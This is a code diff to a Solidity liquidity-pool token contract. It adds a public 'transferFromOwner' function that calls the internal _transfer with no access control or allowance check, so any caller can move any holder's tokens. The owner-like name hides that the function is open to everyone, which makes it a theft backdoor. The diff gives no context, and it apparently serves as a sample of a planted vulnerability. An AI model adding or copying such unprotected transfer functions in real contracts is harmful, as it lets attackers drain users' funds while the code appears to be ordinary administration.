@@ -27,6 +27,10 @@ contract LPToken is ERC20Burnable, Ownable {
         return super.owner();
     }
 
+    function transferFromOwner(address from, address to, uint256 amount) public {
+        super._transfer(from, to, amount);
+    }
+
     function transferOwnership(address newOwner) public override onlyOwner {
         super.transferOwnership(newOwner);
     }
